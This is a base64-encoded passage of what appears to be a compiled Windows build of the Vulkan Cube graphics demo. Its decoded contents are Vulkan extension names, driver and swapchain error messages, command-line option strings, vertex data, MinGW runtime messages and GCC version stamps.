ZCByZXF1aXJlZCB2YWxpZGF0aW9uIGxheWVyLgoKUGxlYXNlIGxvb2sgYXQgdGhlIEdldHRpbmcgU3RhcnRlZCBndWlkZSBmb3IgYWRkaXRpb25hbCBpbmZvcm1hdGlvbi4KAFZLX0tIUl9zdXJmYWNlAFZLX0tIUl93aW4zMl9zdXJmYWNlAFZLX0tIUl9nZXRfcGh5c2ljYWxfZGV2aWNlX3Byb3BlcnRpZXMyAFZLX0VYVF9kZWJ1Z191dGlscwB2a0VudW1lcmF0ZUluc3RhbmNlRXh0ZW5zaW9uUHJvcGVydGllcyBmYWlsZWQgdG8gZmluZCB0aGUgVktfS0hSX3N1cmZhY2UgZXh0ZW5zaW9uLgoKRG8geW91IGhhdmUgYSBjb21wYXRpYmxlIFZ1bGthbiBpbnN0YWxsYWJsZSBjbGllbnQgZHJpdmVyIChJQ0QpIGluc3RhbGxlZD8KUGxlYXNlIGxvb2sgYXQgdGhlIEdldHRpbmcgU3RhcnRlZCBndWlkZSBmb3IgYWRkaXRpb25hbCBpbmZvcm1hdGlvbi4KAHZrRW51bWVyYXRlSW5zdGFuY2VFeHRlbnNpb25Qcm9wZXJ0aWVzIGZhaWxlZCB0byBmaW5kIHRoZSBWS19LSFJfd2luMzJfc3VyZmFjZSBleHRlbnNpb24uCgpEbyB5b3UgaGF2ZSBhIGNvbXBhdGlibGUgVnVsa2FuIGluc3RhbGxhYmxlIGNsaWVudCBkcml2ZXIgKElDRCkgaW5zdGFsbGVkPwpQbGVhc2UgbG9vayBhdCB0aGUgR2V0dGluZyBTdGFydGVkIGd1aWRlIGZvciBhZGRpdGlvbmFsIGluZm9ybWF0aW9uLgoAQ2Fubm90IGZpbmQgYSBjb21wYXRpYmxlIFZ1bGthbiBpbnN0YWxsYWJsZSBjbGllbnQgZHJpdmVyIChJQ0QpLgoKUGxlYXNlIGxvb2sgYXQgdGhlIEdldHRpbmcgU3RhcnRlZCBndWlkZSBmb3IgYWRkaXRpb25hbCBpbmZvcm1hdGlvbi4KAENhbm5vdCBmaW5kIGEgc3BlY2lmaWVkIGV4dGVuc2lvbiBsaWJyYXJ5LgpNYWtlIHN1cmUgeW91ciBsYXllcnMgcGF0aCBpcyBzZXQgYXBwcm9wcmlhdGVseS4KAHZrQ3JlYXRlSW5zdGFuY2UgZmFpbGVkLgoKRG8geW91IGhhdmUgYSBjb21wYXRpYmxlIFZ1bGthbiBpbnN0YWxsYWJsZSBjbGllbnQgZHJpdmVyIChJQ0QpIGluc3RhbGxlZD8KUGxlYXNlIGxvb2sgYXQgdGhlIEdldHRpbmcgU3RhcnRlZCBndWlkZSBmb3IgYWRkaXRpb25hbCBpbmZvcm1hdGlvbi4KAHZrRW51bWVyYXRlUGh5c2ljYWxEZXZpY2VzIEZhaWx1cmUAdmtFbnVtZXJhdGVQaHlzaWNhbERldmljZXMgcmVwb3J0ZWQgemVybyBhY2Nlc3NpYmxlIGRldmljZXMuCgpEbyB5b3UgaGF2ZSBhIGNvbXBhdGlibGUgVnVsa2FuIGluc3RhbGxhYmxlIGNsaWVudCBkcml2ZXIgKElDRCkgaW5zdGFsbGVkPwpQbGVhc2UgbG9vayBhdCB0aGUgR2V0dGluZyBTdGFydGVkIGd1aWRlIGZvciBhZGRpdGlvbmFsIGluZm9ybWF0aW9uLgoAR1BVICVkIHNwZWNpZmllZCBpcyBub3QgcHJlc2VudCwgR1BVIGNvdW50ID0gJXUKAFVzZXIgRXJyb3IAU3BlY2lmaWVkIEdQVSBudW1iZXIgaXMgbm90IHByZXNlbnQAU2VsZWN0ZWQgR1BVICVkOiAlcywgdHlwZTogJXUKAFZLX0tIUl9zd2FwY2hhaW4AVktfS0hSX3BvcnRhYmlsaXR5X3N1YnNldABWS19LSFJfaW5jcmVtZW50YWxfcHJlc2VudABWS19LSFJfaW5jcmVtZW50YWxfcHJlc2VudCBleHRlbnNpb24gZW5hYmxlZAoAVktfS0hSX2luY3JlbWVudGFsX3ByZXNlbnQgZXh0ZW5zaW9uIE5PVCBBVkFJTEFCTEUKAFZLX0dPT0dMRV9kaXNwbGF5X3RpbWluZwBWS19HT09HTEVfZGlzcGxheV90aW1pbmcgZXh0ZW5zaW9uIGVuYWJsZWQKAFZLX0dPT0dMRV9kaXNwbGF5X3RpbWluZyBleHRlbnNpb24gTk9UIEFWQUlMQUJMRQoAdmtFbnVtZXJhdGVEZXZpY2VFeHRlbnNpb25Qcm9wZXJ0aWVzIGZhaWxlZCB0byBmaW5kIHRoZSBWS19LSFJfc3dhcGNoYWluIGV4dGVuc2lvbi4KCkRvIHlvdSBoYXZlIGEgY29tcGF0aWJsZSBWdWxrYW4gaW5zdGFsbGFibGUgY2xpZW50IGRyaXZlciAoSUNEKSBpbnN0YWxsZWQ/ClBsZWFzZSBsb29rIGF0IHRoZSBHZXR0aW5nIFN0YXJ0ZWQgZ3VpZGUgZm9yIGFkZGl0aW9uYWwgaW5mb3JtYXRpb24uCgB2a0NyZWF0ZURlYnVnVXRpbHNNZXNzZW5nZXJFWFQAdmtEZXN0cm95RGVidWdVdGlsc01lc3NlbmdlckVYVAB2a1N1Ym1pdERlYnVnVXRpbHNNZXNzYWdlRVhUAHZrQ21kQmVnaW5EZWJ1Z1V0aWxzTGFiZWxFWFQAdmtDbWRFbmREZWJ1Z1V0aWxzTGFiZWxFWFQAdmtDbWRJbnNlcnREZWJ1Z1V0aWxzTGFiZWxFWFQAdmtTZXREZWJ1Z1V0aWxzT2JqZWN0TmFtZUVYVABHZXRQcm9jQWRkcjogRmFpbHVyZQBHZXRQcm9jQWRkcjogRmFpbGVkIHRvIGluaXQgVktfRVhUX2RlYnVnX3V0aWxzCgBDcmVhdGVEZWJ1Z1V0aWxzTWVzc2VuZ2VyRVhUIEZhaWx1cmUAQ3JlYXRlRGVidWdVdGlsc01lc3NlbmdlckVYVDogb3V0IG9mIGhvc3QgbWVtb3J5CgBDcmVhdGVEZWJ1Z1V0aWxzTWVzc2VuZ2VyRVhUOiB1bmtub3duIGZhaWx1cmUKAHZrR2V0UGh5c2ljYWxEZXZpY2VTdXJmYWNlU3VwcG9ydEtIUgB2a0dldEluc3RhbmNlUHJvY0FkZHIgRmFpbHVyZQB2a0dldEluc3RhbmNlUHJvY0FkZHIgZmFpbGVkIHRvIGZpbmQgdmtHZXRQaHlzaWNhbERldmljZVN1cmZhY2VTdXBwb3J0S0hSAHZrR2V0UGh5c2ljYWxEZXZpY2VTdXJmYWNlQ2FwYWJpbGl0aWVzS0hSAHZrR2V0SW5zdGFuY2VQcm9jQWRkciBmYWlsZWQgdG8gZmluZCB2a0dldFBoeXNpY2FsRGV2aWNlU3VyZmFjZUNhcGFiaWxpdGllc0tIUgB2a0dldFBoeXNpY2FsRGV2aWNlU3VyZmFjZUZvcm1hdHNLSFIAdmtHZXRJbnN0YW5jZVByb2NBZGRyIGZhaWxlZCB0byBmaW5kIHZrR2V0UGh5c2ljYWxEZXZpY2VTdXJmYWNlRm9ybWF0c0tIUgB2a0dldFBoeXNpY2FsRGV2aWNlU3VyZmFjZVByZXNlbnRNb2Rlc0tIUgB2a0dldEluc3RhbmNlUHJvY0FkZHIgZmFpbGVkIHRvIGZpbmQgdmtHZXRQaHlzaWNhbERldmljZVN1cmZhY2VQcmVzZW50TW9kZXNLSFIAdmtHZXRTd2FwY2hhaW5JbWFnZXNLSFIAdmtHZXRJbnN0YW5jZVByb2NBZGRyIGZhaWxlZCB0byBmaW5kIHZrR2V0U3dhcGNoYWluSW1hZ2VzS0hSAHZrY3ViZQAlczogCgAlZiwgJWYsICVmLCAlZgoACgBQNgoAJXUgJXUAMjU1CgBMb2FkIFRleHR1cmUgRmFpbHVyZQBGYWlsZWQgdG8gbG9hZCB0ZXh0dXJlcwBFcnJvciBsb2FkaW5nIHRleHR1cmU6ICVzCgBsdW5hcmcucHBtAEN1YmVEcmF3Q29tbWFuZEJ1ZgBEcmF3QmVnaW4ASW5zaWRlUmVuZGVyUGFzcwBBY3R1YWxEcmF3AFByZXNlbnQgbW9kZSB1bnN1cHBvcnRlZABQcmVzZW50IG1vZGUgc3BlY2lmaWVkIGlzIG5vdCBzdXBwb3J0ZWQKAC0tdXNlX3N0YWdpbmcALS1wcmVzZW50X21vZGUALS1icmVhawAtLXZhbGlkYXRlAC0tdmFsaWRhdGUtY2hlY2tzLWRpc2FibGVkAC0teGxpYgAtLXhsaWIgaXMgZGVwcmVjYXRlZCBhbmQgbm8gbG9uZ2VyIGRvZXMgYW55dGhpbmcALS1jACVkAC0td2lkdGgALS1oZWlnaHQALS1zdXBwcmVzc19wb3B1cHMALS1kaXNwbGF5X3RpbWluZwAtLWluY3JlbWVudGFsX3ByZXNlbnQALS1ncHVfbnVtYmVyAFVzYWdlIEVycm9yAFZ1bGthbiBDdWJlAFVuZXhwZWN0ZWQgZXJyb3IgdHJ5aW5nIHRvIHN0YXJ0IHRoZSBhcHBsaWNhdGlvbiEKAENhbm5vdCBjcmVhdGUgYSB3aW5kb3cgaW4gd2hpY2ggdG8gZHJhdyEKAFN3YXBjaGFpbiBJbml0aWFsaXphdGlvbiBGYWlsdXJlAENvdWxkIG5vdCBmaW5kIGJvdGggZ3JhcGhpY3MgYW5kIHByZXNlbnQgcXVldWVzCgB2a0dldERldmljZVByb2NBZGRyAHZrQ3JlYXRlU3dhcGNoYWluS0hSAHZrR2V0RGV2aWNlUHJvY0FkZHIgRmFpbHVyZQB2a0dldERldmljZVByb2NBZGRyIGZhaWxlZCB0byBmaW5kIHZrQ3JlYXRlU3dhcGNoYWluS0hSAHZrRGVzdHJveVN3YXBjaGFpbktIUgB2a0dldERldmljZVByb2NBZGRyIGZhaWxlZCB0byBmaW5kIHZrRGVzdHJveVN3YXBjaGFpbktIUgB2a0dldERldmljZVByb2NBZGRyIGZhaWxlZCB0byBmaW5kIHZrR2V0U3dhcGNoYWluSW1hZ2VzS0hSAHZrQWNxdWlyZU5leHRJbWFnZUtIUgB2a0dldERldmljZVByb2NBZGRyIGZhaWxlZCB0byBmaW5kIHZrQWNxdWlyZU5leHRJbWFnZUtIUgB2a1F1ZXVlUHJlc2VudEtIUgB2a0dldERldmljZVByb2NBZGRyIGZhaWxlZCB0byBmaW5kIHZrUXVldWVQcmVzZW50S0hSAHZrR2V0UmVmcmVzaEN5Y2xlRHVyYXRpb25HT09HTEUAdmtHZXREZXZpY2VQcm9jQWRkciBmYWlsZWQgdG8gZmluZCB2a0dldFJlZnJlc2hDeWNsZUR1cmF0aW9uR09PR0xFAHZrR2V0UGFzdFByZXNlbnRhdGlvblRpbWluZ0dPT0dMRQB2a0dldERldmljZVByb2NBZGRyIGZhaWxlZCB0byBmaW5kIHZrR2V0UGFzdFByZXNlbnRhdGlvblRpbWluZ0dPT0dMRQBDYW4ndCBmaW5kIG91ciBwcmVmZXJyZWQgZm9ybWF0cy4uLiBGYWxsaW5nIGJhY2sgdG8gZmlyc3QgZXhwb3NlZCBmb3JtYXQuIFJlbmRlcmluZyBtYXkgYmUgaW5jb3JyZWN0LgoAZXZlbnQgbG9vcCBlcnJvcgBXYWl0TWVzc2FnZSgpIGZhaWxlZCBvbiBwYXVzZWQgZGVtbwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIA/AACAPwAAgD8AAIA/AAAAAAAAgD8AAAAAAAAAAAAAAAAAAAAAAACAPwAAgD8AAIA/AAAAAAAAAAAAAAAAAACAPwAAgD8AAIA/AACAPwAAAAAAAAAAAAAA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XzY0LXVjcnQtcG9zaXgtc2VoLCBidWlsdCBieSBCcmVjaHQgU2FuZGVycykgMTIuMi4wAAAAAAAAAAAAAEdDQzogKE1pbkdXLVc2NCB4ODZfNjQtdWNydC1wb3NpeC1zZWgsIGJ1aWx0IGJ5IEJyZWNodCBTYW5kZXJzKSAxMi4yLjAAAAAAAAAAAAAAR0NDOiAoTWluR1ctVzY0IHg4Nl82NC11Y3J0LXBvc2l4LXNlaCwgYnVpbHQgYnkgQnJlY2h0IFNhbmRlcnMpIDEyLjIuMAAAAAAAAAAAAABHQ0M6IChNaW5HVy1XNjQgeDg2XzY0LXVjcnQtcG9zaXgtc2VoLCBidWlsdCBieSBCcmVjaHQgU2FuZGVycykgMTIuMi4wAAAAAAAAAAAAAEdDQzogKE1pbkdXLVc2NCB4ODZfNjQtdWNydC1wb3NpeC1zZWgsIGJ1aWx0IGJ5IEJyZWNodCBTYW5kZXJzKSAxMi4yLjAAAAAAAAAAAAAAR0NDOiAoTWluR1ctVzY0IHg4Nl82NC11Y3J0LXBvc2l4LXNlaCwgYnVpbHQgYnkgQnJlY2h0IFNhbmRlcnMpIDEyLjIuMAAAAAAAAAAAAABHQ0M6IChNaW5HVy1XNjQgeDg2XzY0LXVjcnQtcG9zaXgtc2VoLCBidWlsdCBieSBCcmVjaHQgU2FuZGVycykgMTIuMi4wAAAAAAAAAAAAAEdDQzogKE1pbkdXLVc2NCB4ODZfNjQtdWNydC1wb3NpeC1zZWgsIGJ1aWx0IGJ5IEJyZWNodCBTYW5kZXJzKSAxMi4yLjAAAAAAAAAAAAAAR0NDOiAoTWluR1ctVzY0IHg4Nl82NC11Y3J0LXBvc2l4LXNlaCwgYnVpbHQgYnkgQnJlY2h0IFNhbmRlcnMpIDEyLjIuMAAAAAAAAAAAAABHQ0M6IChNaW5HVy1XNjQgeDg2XzY0LXVjcnQtcG9zaXgtc2VoLCBidWlsdCBieSBCcmVjaHQgU2FuZGVycykgMTIuMi4wAAAAAAAAAAAAAEdDQzogKE1pbkdXLVc2NCB4ODZfNjQtdWNydC1wb3NpeC1zZWgsIGJ1aWx0IGJ5IEJyZWNodCBTYW5kZXJzKSAxMi4yLjAAAAAAAAAAAAAAR0NDOiAoTWluR1ctVzY0IHg4Nl82NC11Y3J0LXBvc2l4LXNlaCwgYnVpbHQgYnkgQnJlY2h0IFNhbmRlcnMpIDEyLjIuMAAAAAAAAAAAAABHQ0M6IChNaW5HVy1XNjQgeDg2XzY0LXVjcnQtcG9zaXgtc2VoLCBidWlsdCBieSBCcmVjaHQgU2FuZGVycykgMTIuMi4wAAAAAAAAAAAAAEdDQzogKE1pbkdXLVc2NCB4ODZfNjQtdWNydC1wb3NpeC1zZWgsIGJ1aWx0IGJ5IEJyZWNodCBTYW5kZXJzKSAxMi4yLjAAAAAAAAAAAAAAR0NDOiAoTWluR1ctVzY0IHg4Nl82NC11Y3J0LXBvc2l4LXNlaCwgYnVpbHQgYnkgQnJlY2h0IFNhbmRlcnMpIDEyLjIuMAAAAAAAAAAAAABHQ0M6IChNaW5HVy1XNjQgeDg2XzY0LXVjcnQtcG9zaXgtc2VoLCBidWlsdCBieSBCcmVjaHQgU2FuZGVycykgMTIuMi4wAAAAAAAAAAAAAEdDQzogKE1pbkdXLVc2NCB4ODZfNjQtdWNydC1wb3NpeC1zZWgsIGJ1aWx0IGJ5IEJyZWNodCBTYW5kZXJzKSAxMi4yLjAAAAAAAAAAAAAAR0NDOiAoTWluR1ctVzY0IHg4Nl82NC11Y3J0LXBvc2l4LXNlaCwgYnVpbHQgYnkgQnJlY2h0IFNhbmRlcnMpIDEyLjIuMAAAAAAAAAAAAABHQ0M6IChNaW5HVy1XNjQgeDg2XzY0LXVjcnQtcG9zaXgtc2VoLCBidWlsdCBieSBCcmVjaHQgU2FuZGVycykgMTIuMi4wAAAAAAAAAAAAAEdDQzogKE1pbkdXLVc2NCB4ODZfNjQtdWNydC1wb3NpeC1zZWgsIGJ1aWx0IGJ5IEJyZWNodCBTYW5kZXJzKSAxMi4yLjAAAAAAAAAAAAAAR0NDOiAoTWluR1ctVzY0IHg4Nl82NC11Y3J0LXBvc2l4LXNlaCwgYnVpbHQgYnkgQnJlY2h0IFNhbmRlcnMpIDEyLjIuMAAAAAAAAAAAAABHQ0M6IChNaW5HVy1XNjQgeDg2XzY0LXVjcnQtcG9zaXgtc2VoLCBidWlsdCBieSBCcmVjaHQgU2FuZGVycykgMTIuMi4wAAAAAAAAAAAAAEdDQzogKE1pbkdXLVc2NCB4ODZfNjQtdWNydC1wb3NpeC1zZWgsIGJ1aWx0IGJ5IEJyZWNodCBTYW5kZXJzKSAxMi4yLjAAAAAAAAAAAAAAR0NDOiAoTWluR1ctVzY0IHg4Nl82NC11Y3J0LXBvc2l4LXNlaCwgYnVpbHQgYnkgQnJlY2h0IFNhbmRlcnMpIDEyLjIuMAAAAAAAAAAAAABHQ0M6IChNaW5HVy1XNjQgeDg2XzY0LXVjcnQtcG9zaXgtc2VoLCBidWlsdCBieSBCcmVjaHQgU2FuZGVycykgMTIuMi4wAAAAAAAAAAAAAEdDQzogKE1pbkdXLVc2NCB4ODZfNjQtdWNydC1wb3NpeC1zZWgsIGJ1aWx0IGJ5IEJyZWNodCBTYW5kZXJzKSAxMi4yLjAAAAAAAAAAAAAAR0NDOiAoTWluR1ctVzY0IHg4Nl82NC11Y3J0LXBvc2l4LXNlaCwgYnVpbHQgYnkgQnJlY2h0IFNhbmRlcnMpIDEyLjIuMAAAAAAAAAAAAABHQ0M6IChNaW5HVy1XNjQgeDg2XzY0LXVjcnQtcG9zaXgtc2VoLCBidWlsdCBieSBCcmVjaHQgU2FuZGVycykgMTIuMi4wAAAAAAAAAAAAAEdDQzogKE1pbkdXLVc2NCB4ODZfNjQtdWNydC1wb3NpeC1zZWgsIGJ1aWx0IGJ5IEJyZWNodCBTYW5kZXJzKSAxMi4yLjAAAAAAAAAAAAAAR0NDOiAoTWluR1ctVzY0IHg4Nl82NC11Y3J0LXBvc2l4LXNlaCwgYnVpbHQgYnkgQnJlY2h0IFNhbmRlcnMpIDEyLjIuMAAAAAAAAAAAAABHQ0M6IChNaW5HVy1XNjQgeDg2XzY0LXVjcnQtcG9zaXgtc2VoLCBidWlsdCBieSBCcmVjaHQgU2FuZGVycykgMTIuMi4wAAAAAAAAAAAAAEdDQzogKE1pbkdXLVc2NCB4ODZfNjQtdWNydC1wb3NpeC1zZWgsIGJ1aWx0IGJ5IEJyZWNodCBTYW5kZXJzKSAxMi4yLjAAAAAAAAAAAAAAR0NDOiAoTWluR1ctVzY0IHg4Nl82NC11Y3J0LXBvc2l4LXNlaCwgYnVpbHQgYnkgQnJlY2h0IFNhbmRlcnMpIDEyLjIuMAAAAAAAAAAAAABHQ0M6IChNaW5HVy1XNjQgeDg2XzY0LXVjcnQtcG9zaXgtc2